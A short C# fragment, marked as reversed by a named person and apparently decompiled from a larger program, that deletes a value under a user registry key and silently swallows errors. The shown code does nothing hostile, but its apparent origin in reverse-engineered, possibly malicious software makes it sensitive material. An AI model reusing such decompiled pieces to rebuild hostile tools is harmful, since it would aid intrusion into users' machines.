//Reversed by Etor Madiv

public static void  DLV(string n)
{
	try
	{
		F.Registry.CurrentUser.OpenSubKey(System.String.Concat("Software\\", RG), true).DeleteValue(n);
	}
	catch(Exception)
	{
		
	}
}
